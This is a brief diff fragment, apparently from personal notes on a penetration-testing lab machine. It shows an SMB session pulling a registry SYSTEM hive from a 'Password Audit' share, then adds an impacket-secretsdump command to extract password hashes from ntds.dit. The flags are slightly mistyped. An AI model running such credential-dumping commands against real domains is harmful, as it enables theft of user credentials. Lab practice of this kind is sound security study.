@@ -1046,6 +1046,8 @@ smbclient //192.168.124.175/Password\ Audit -U 'resourced.local\V.Ventz'
 cd registry
 get SYSTEM
 
+# SYSTEM CRACK 
+impacket-secretsdump - ntds ntds.dit - system SYSTEM LOCAL
 
 ```
 
